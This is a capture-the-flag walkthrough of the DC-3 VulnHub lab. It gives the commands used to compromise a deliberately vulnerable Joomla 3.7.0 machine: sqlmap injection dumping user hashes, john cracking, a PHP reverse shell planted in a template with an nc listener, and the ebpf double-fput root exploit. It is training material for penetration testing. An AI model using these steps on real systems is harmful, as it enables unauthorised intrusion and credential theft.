# DC3 Vulnhub Walkthrough

#### Description

DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For those with experience doing CTF and Boot2Root challenges, this probably won't take you long at all (in fact, it could take you less than 20 minutes easily).

If that's the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.



## Scanning 

  ### Reconnaissance 
  
Sudo netdiscover
  
  ![Screenshot from 2023-01-17 01-14-16](https://user-images.githubusercontent.com/108471951/213867465-39a9e0fd-e30b-4742-8c6c-4a6cefbe7492.png)

Firstly we have to identify the machine IP address using tool like NetDiscover

### Nmap

nmap -sC -sV -p- 192.168.0.106


![Screenshot from 2023-01-21 18-20-04](https://user-images.githubusercontent.com/108471951/213867561-351b64f7-3804-4da4-90db-c07a1efe64f6.png)


only port 80 open. let’s see what we can find on the website.

![Screenshot from 2023-01-17 01-20-01](https://user-images.githubusercontent.com/108471951/213867622-9bbd872b-781f-4acf-a521-445e13580711.png)

Nothing found here so i went to README.txt page in the website

192.168.0.106/README.txt

![Screenshot from 2023-01-21 18-24-02](https://user-images.githubusercontent.com/108471951/213867810-e75de70c-d523-40e2-b990-a1bf55c0f43c.png)

We can see its a Joomla Site so I used joomscan

joomscan -u http://192.168.0.106/
  
![Screenshot from 2023-01-21 18-29-02](https://user-images.githubusercontent.com/108471951/213867919-f0ab7340-4334-423a-9a9c-dadabe76f01a.png)

![Screenshot from 2023-01-20 16-02-10](https://user-images.githubusercontent.com/108471951/213867966-7967db14-7ab7-4e02-8dfb-3b5c24414afd.png)

I Nothing found here so I searched for exploit for joomla 3.7.0 exploit in searchsploit

searchsploit joomla 3.7.0


![Screenshot from 2023-01-20 17-37-21](https://user-images.githubusercontent.com/108471951/213868030-e86aae21-c9a0-4e7e-b212-b71f0d2fb760.png)

I found a exploit with exact verison 3.7.0 then i copied the exploit to my path using command 

searchsploit -m php/webapps/42033.txt


![Screenshot from 2023-01-20 17-48-31](https://user-images.githubusercontent.com/108471951/213868147-7a2aa1d5-ab05-4eef-9b96-ccdcea692a76.png)

cat 42033.txt

![Screenshot from 2023-01-20 17-50-09](https://user-images.githubusercontent.com/108471951/213868167-ad422f11-2164-449d-82e3-cdc99bf5b56b.png)


here we can check the usage 

As in the usage I have pasted the link which is in usage, after url

![Screenshot from 2023-01-20 17-51-20](https://user-images.githubusercontent.com/108471951/214651912-a329a7ab-bacf-42af-aec7-501a8e9bba0d.png)

By that we gor sql error ,then I confirmed this site is vulnerable to SQL SYNTAX ,after I run sqlmap tool


sqlmap -u "http://192.168.0.106//index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

![Screenshot from 2023-01-20 17-53-37](https://user-images.githubusercontent.com/108471951/214653293-68418277-3efe-4029-b5f2-c6039c748f24.png)


now i got availabe databases 


![Screenshot from 2023-01-20 17-59-26](https://user-images.githubusercontent.com/108471951/214653410-39b75645-6358-4ee2-8a34-cd16924634e9.png)


in this the zoomlabd is intersting for me 

 sqlmap -u "http://192.168.0.106//index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables


![Screenshot from 2023-01-20 18-35-21](https://user-images.githubusercontent.com/108471951/214654180-128d96e0-5ebe-4e96-80a7-68014db604a1.png)


now i got tables 


![Screenshot from 2023-01-20 18-36-07](https://user-images.githubusercontent.com/108471951/214654277-56d102fb-8560-46ee-8ed5-0912b6d3dd32.png)

in that i found users, so i dumped the users

sqlmap -u "http://192.168.0.106//index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump

![Screenshot from 2023-01-20 18-41-22](https://user-images.githubusercontent.com/108471951/214654478-0d269bda-9533-4200-bc23-5957c25609af.png)

here i found user name and passwd,but as we can see the passwd is in hash formate.
i created a file hash.txt with hash in it

 echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' >hash.txt
 
![Screenshot from 2023-01-20 18-48-10](https://user-images.githubusercontent.com/108471951/214654966-42939139-5cd4-4ac9-873a-cc9d783df2ae.png)

cat hash.txt


![Screenshot from 2023-01-20 18-48-25](https://user-images.githubusercontent.com/108471951/214655029-59b8b81b-3ebd-4d00-b98d-e9d3ab77696a.png)

i used john tool to decrypt the hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=bcrypt    

![Screenshot from 2023-01-20 18-48-52](https://user-images.githubusercontent.com/108471951/214655352-51cea122-3d0b-4ed4-b4b5-854d9d248585.png)

I got the passwd = sonnpy

now i have user name and password for the site so now i need admin login page , I am using dirsearch to find the login page 


dirsearch -u https://192.168.0.106  

![Screenshot from 2023-01-20 19-04-53](https://user-images.githubusercontent.com/108471951/214655847-1546b235-4ff3-45b2-ac2a-05c0e877c4fa.png)

![Screenshot from 2023-01-20 19-12-08](https://user-images.githubusercontent.com/108471951/214655998-c6b48a25-2172-4eb2-ad21-2600f7024297.png)

i found /administrator

now i went to login page by 


https://192.168.0.106/administrator


![Screenshot from 2023-01-20 19-12-35](https://user-images.githubusercontent.com/108471951/214656350-7af811e7-fc48-47fa-b9e7-6b9f0f21090a.png)

I successfully signedup the login credintials which we found before


In templates there is index.php where we can upload a php reverse shell

![Screenshot from 2023-01-20 19-14-01](https://user-images.githubusercontent.com/108471951/214656852-dbe38b76-9533-4d53-b18d-3dde0e8d3407.png)


![Screenshot from 2023-01-20 19-14-24](https://user-images.githubusercontent.com/108471951/214657127-e28d5373-bf1b-4f5e-9d1b-fed9343355d3.png)

Now i need a php-reverse-shell so searched for it by useing locate command 

locate php-reverse-shell.php

![Screenshot from 2023-01-20 19-42-08](https://user-images.githubusercontent.com/108471951/214657447-80552ded-32c8-463f-8609-c2f84cd512c0.png)

now I found the path of the php-reverse-shell.php

i open the file using mousepad

mousepad /usr/share/webshells/php/php-reverse-shell

![Screenshot from 2023-01-20 19-42-17](https://user-images.githubusercontent.com/108471951/214657930-0c63df1c-3c1c-4638-8619-ae2bc9f95668.png)

now i edited the IP ,port and given my ip and port as my wish

![Screenshot from 2023-01-20 19-49-49](https://user-images.githubusercontent.com/108471951/214658114-2e9efbc5-1b84-42a0-add2-40c7ac2fadae.png)

now i copied and pasted the text in index.php 

![Screenshot from 2023-01-20 19-53-35](https://user-images.githubusercontent.com/108471951/214658303-a4da57a2-a81a-475b-a209-d9fba5480023.png)

and started listening on the given port 8900

nc -nlvp 8900

![Screenshot from 2023-01-20 19-55-26](https://user-images.githubusercontent.com/108471951/214658581-420d6155-6c90-4a04-b77c-ed625834dcca.png)

now to get the shell i went to templates/beez3/index.php where we uploaded php-reverse-shell

192.168.0.106/templates/beez3/index.php

![Screenshot from 2023-01-20 19-56-05](https://user-images.githubusercontent.com/108471951/214658831-c6ce0a38-4776-4ba7-96c5-4b39803cea01.png)


now i got the shell 
![Screenshot from 2023-01-20 19-56-26](https://user-images.githubusercontent.com/108471951/214658950-2503721c-3312-4002-9a30-1e94d1ab9a2f.png)

uname -a

![Screenshot from 2023-01-20 20-08-17](https://user-images.githubusercontent.com/108471951/214659885-52fcce61-fe1d-4a53-9ea5-68453462f5b7.png)
 
 its a ubuntu server, so to get more deatils
 
 lsb_release -a

![Screenshot from 2023-01-20 20-46-12](https://user-images.githubusercontent.com/108471951/214660110-97afb993-b5db-400c-94f2-a601955ecf44.png)

its ubuntu 16.04 

searchsploit ubuntu 16.04

![Screenshot from 2023-01-20 20-47-52](https://user-images.githubusercontent.com/108471951/214660383-4641b247-2bb8-48d5-b6a4-2664896f636f.png)

double fdput is the famous exploit 


searchsploit -m linux/local/39772.txt

![Screenshot from 2023-01-20 20-49-19](https://user-images.githubusercontent.com/108471951/214661683-2ee93dba-769b-4352-87e6-ae0dbe38952d.png)
 
 
I copied the exploit to my path


ls


![Screenshot from 2023-01-20 21-30-37](https://user-images.githubusercontent.com/108471951/214662156-3ff625f2-61ba-4ee6-b548-cd06cefbb824.png)



cat 39772.txt


![Screenshot from 2023-01-20 21-45-08](https://user-images.githubusercontent.com/108471951/214662741-c1ab005c-e2c0-44ff-acaf-2cc6092b9667.png)

there is some link ,i copied and pasted in the tmp path

cd tmp

![Screenshot from 2023-01-20 21-54-20](https://user-images.githubusercontent.com/108471951/214664561-49114399-d75c-40a1-84ca-ea5a9ea3d4da.png)



![Screenshot from 2023-01-20 21-55-56](https://user-images.githubusercontent.com/108471951/214664817-770a5b07-4385-4eaf-9fee-18441b315822.png)



ls 


unzip 39772.zip


![Screenshot from 2023-01-20 21-56-07](https://user-images.githubusercontent.com/108471951/214664946-9268d21d-d8c5-44f0-9862-0a7b87835fb8.png)

ls 

![Screenshot from 2023-01-20 21-56-45](https://user-images.githubusercontent.com/108471951/214665055-7b9434eb-a5e5-4757-91f6-c8aa90d4de15.png)

cd 39772
ls
![Screenshot from 2023-01-20 22-05-00](https://user-images.githubusercontent.com/108471951/214665204-7da967ee-0dcc-4708-afcf-06539f7ec183.png)


### as per the usage in the exploit 


tar -xvf exploit.tar

![Screenshot from 2023-01-20 22-08-13](https://user-images.githubusercontent.com/108471951/214665284-05207223-4954-4a9f-b318-9241d5d92d7d.png)


/ebpf_mapfd_doubleput$ ./compile.sh
/ebpf_mapfd_doubleput$  ./doubleput

![Screenshot from 2023-01-20 22-16-11](https://user-images.githubusercontent.com/108471951/214665848-e81a6f89-b9e4-4a73-b6c8-6cf1e1e758e8.png)

cd /ebpf_mapfd_doubleput_exploit

ls 

![Screenshot from 2023-01-20 22-21-37](https://user-images.githubusercontent.com/108471951/214666052-9b398b7d-b4f1-4daa-b427-33d8408ce0de.png)


./compile.sh

![Screenshot from 2023-01-20 22-22-56](https://user-images.githubusercontent.com/108471951/214666115-df49d175-c673-41ba-8dc7-d841088d034d.png)

ls

![Screenshot from 2023-01-20 22-23-36](https://user-images.githubusercontent.com/108471951/214666205-fea6b5b1-6b24-4b09-ae6c-2018f5fe56fd.png)

./doubleput


![Screenshot from 2023-01-20 22-25-18](https://user-images.githubusercontent.com/108471951/214666290-81897885-f9ab-47a8-953a-222e65ddcb2b.png)

now i got root previlage

cd /
ls

![Screenshot from 2023-01-20 22-59-43](https://user-images.githubusercontent.com/108471951/214666533-17c1e7ca-d563-441a-bfdc-024606e92837.png)

cd root

ls

![Screenshot from 2023-01-20 23-00-10](https://user-images.githubusercontent.com/108471951/214666619-f14e8808-4309-443f-a5ef-2ed6d9b47c85.png)


I sucsesfully found the flag


@robinpaul #robinpaul





